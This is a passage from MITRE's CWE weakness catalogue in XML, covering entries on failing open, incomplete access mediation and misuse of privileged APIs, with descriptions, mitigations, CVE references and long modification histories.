               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Modes_of_Introduction, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2024-02-29</Modification_Date>
					<Modification_Version>4.14</Modification_Version>
					<Modification_ReleaseDate>2024-02-29</Modification_ReleaseDate>
					<Modification_Comment>updated Demonstrative_Examples, Mapping_Notes</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-04-11">Externally Controlled Reference to an Internal Resource</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="636" Name="Not Failing Securely ('Failing Open')" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.</Description>
         <Extended_Description>By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to "fail functional" to minimize administration and support costs, instead of "failing safe."</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="755" View_ID="1000"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="280" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
			<Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
			<Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Failing Open</Term>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
               <Note>Intended access restrictions can be bypassed, which is often contradictory to what the product's administrator expects.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Subdivide and allocate resources and components so that a failure in one part does not affect the entire product.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-164">
               <Intro_Text>Switches may revert their functionality to that of hubs when the table used to map ARP information to the switch interface overflows, such as when under a spoofing attack. This results in traffic being broadcast to an eavesdropper, instead of being sent only on the relevant switch interface. To mitigate this type of problem, the developer could limit the number of ARP entries that can be recorded for a given switch interface, while other interfaces may keep functioning normally. Configuration options can be provided on the appropriate actions to be taken in case of a detected failure, but safe defaults should be used.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-5277</Reference>
               <Description>The failure of connection attempts in a web browser resets DNS pin restrictions. An attacker can then bypass the same origin policy by rebinding a domain name to a different IP address. This was an attempt to "fail functional."</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5277</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4407</Reference>
               <Description>Incorrect prioritization leads to the selection of a weaker cipher. Although it is not known whether this issue occurred in implementation or design, it is feasible that a poorly designed algorithm could be a factor.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4407</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A7</Entry_ID>
               <Entry_Name>Improper Error Handling</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-522"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Notes>
            <Note Type="Research Gap">Since design issues are hard to fix, they are rarely publicly reported, so there are few CVE examples of this problem as of January 2008. Most publicly reported issues occur as the result of an implementation error instead of design, such as CVE-2005-3177 (Improper handling of large numbers of resources) or CVE-2005-2969 (inadvertently disabling a verification step, leading to selection of a weaker protocol).</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Pascal Meunier</Submission_Name>
               <Submission_Organization>Purdue University</Submission_Organization>
               <Submission_Date>2008-01-18</Submission_Date>
               <Submission_Version>Draft 8</Submission_Version>
               <Submission_ReleaseDate>2008-01-30</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description, Name, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Research_Gaps</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-04-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2008-09-09">Design Principle Violation: Not Failing Securely</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Not Failing Securely (aka 'Failing Open')</Previous_Entry_Name>
            <Previous_Entry_Name Date="2009-05-27">Not Failing Securely (aka 'Failing Open')</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="638" Name="Not Using Complete Mediation" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="862" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Scope>Access Control</Scope>
               <Scope>Other</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Bypass Protection Mechanism</Impact>
               <Impact>Read Application Data</Impact>
               <Impact>Other</Impact>
               <Note>A user might retain access to a critical resource even after privileges have been revoked, possibly allowing access to privileged functionality or sensitive information, depending on the role of the resource.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Invalidate cached privileges, file handles or descriptors, or other access credentials whenever identities, processes, policies, roles, capabilities or permissions change. Perform complete authentication checks before accepting, caching and reusing data, dynamic content and code (scripts). Avoid caching access control decisions as much as possible.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Identify all possible code paths that might access sensitive resources. If possible, create and use a single interface that performs the access checks, and develop code standards that require use of this interface.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-166">
               <Intro_Text>When executable library files are used on web servers, which is common in PHP applications, the developer might perform an access check in any user-facing executable, and omit the access check from the library file itself. By directly requesting the library file (CWE-425), an attacker can bypass this access check.</Intro_Text>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>When a developer begins to implement input validation for a web application, often the validation is performed in each area of the code that uses externally-controlled input. In complex applications with many inputs, the developer often misses a parameter here or a cookie there. One frequently-applied solution is to centralize all input validation, store these validated inputs in a separate data structure, and require that all access of those inputs must be through that data structure. An alternate approach would be to use an external input validation framework such as Struts, which performs the validation before the inputs are ever processed by the code.</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2007-0408</Reference>
               <Description>Server does not properly validate client certificates when reusing cached connections.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-0408</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP20</Entry_ID>
               <Entry_Name>Race Condition Window</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="104"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-196"/>
            <Reference External_Reference_ID="REF-526"/>
         </References>
         <Mapping_Notes>
            <Usage>Allowed-with-Review</Usage>
            <Rationale>This CWE entry is a Class and might have Base-level children that would be more appropriate</Rationale>
            <Comments>Examine children of this entry to see if there is a better fit</Comments>
            <Reasons>
               <Reason Type="Abstraction"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Pascal Meunier</Submission_Name>
               <Submission_Organization>Purdue University</Submission_Organization>
               <Submission_Date>2008-01-18</Submission_Date>
               <Submission_Version>Draft 8</Submission_Version>
               <Submission_ReleaseDate>2008-01-30</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships, Observed_Example, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Description, Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Name</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Causal_Nature</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2022-10-13</Modification_Date>
					<Modification_Comment>updated References</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated References, Relationships, Time_of_Introduction</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-10-26</Modification_Date>
					<Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-01-12">Design Principle Violation: Not Using Complete Mediation</Previous_Entry_Name>
            <Previous_Entry_Name Date="2010-12-13">Failure to Use Complete Mediation</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="648" Name="Incorrect Use of Privileged APIs" Abstraction="Base" Structure="Simple" Status="Incomplete">
         <Description>The product does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.</Description>
         <Extended_Description>
            <xhtml:p>When a product contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to:</xhtml:p>
               <xhtml:ul>
                  <xhtml:li>ensure that assumptions made by the APIs are valid, such as validity of arguments</xhtml:li>
                  <xhtml:li>account for known weaknesses in the design/implementation of the API</xhtml:li>
                  <xhtml:li>call the API from a safe context</xhtml:li>
               </xhtml:ul>
            <xhtml:p>If the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data.</xhtml:p>
            <xhtml:p>For instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="269" View_ID="1000" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
            <Introduction>
               <Phase>Operation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>Low</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Gain Privileges or Assume Identity</Impact>
               <Note>An attacker may be able to elevate privileges.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>An attacker may be able to obtain sensitive information.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker may be able to execute code.</Note>
            </Consequence>
         </Common_Consequences>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Before calling privileged APIs, always ensure that the assumptions made by the privileged code hold true prior to making the call.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Know architecture and implementation weaknesses of the privileged APIs and make sure to account for these weaknesses before calling the privileged APIs to ensure that they can be called safely.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If privileged APIs make certain assumptions about data, context or state validity that are passed by the caller, the calling code must ensure that these assumptions have been validated prior to making the call.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>If privileged APIs do not shed their privilege prior to returning to the calling code, then calling code needs to shed these privileges immediately and safely right after the call to the privileged APIs. In particular, the calling code needs to ensure that a privileged thread of execution will never be returned to the user or made available to user-controlled processes.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Only call privileged APIs from safe, consistent and expected state.</Description>
            </Mitigation>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Description>Ensure that a failure or an error will not leave a system in a state where privileges are not properly shed and privilege escalation is possible (i.e. fail securely with regards to handling of privileges).</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2003-0645</Reference>
               <Description>A Unix utility that displays online help files, if installed setuid, could allow a local attacker to gain privileges when a particular file-opening function is called.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0645</Link>
            </Observed_Example>
         </Observed_Examples>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="107"/>
            <Related_Attack_Pattern CAPEC_ID="234"/>
         </Related_Attack_Patterns>
         <Mapping_Notes>
            <Usage>Allowed</Usage>
            <Rationale>This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.</Rationale>
            <Comments>Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.</Comments>
            <Reasons>
               <Reason Type="Acceptable-Use"/>
            </Reasons>
         </Mapping_Notes>
         <Content_History>
            <Submission>
               <Submission_Name>Evgeny Lebanidze</Submission_Name>
               <Submission_Organization>Cigital</Submission_Organization>
               <Submission_Date>2008-01-30</Submission_Date>
               <Submission_Version>Draft 8</Submission_Version>
               <Submission_ReleaseDate>2008-01-30</Submission_ReleaseDate>
            </Submission>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-10-14</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Name, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Enabling_Factors_for_Exploitation, Observed_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-04-27</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-06-29</Modification_Date>
					<Modification_Comment>updated Mapping_Notes, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-05-27">Improper Use of Privileged APIs</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="655" Name="Insufficient Psychological Acceptability" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="657" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
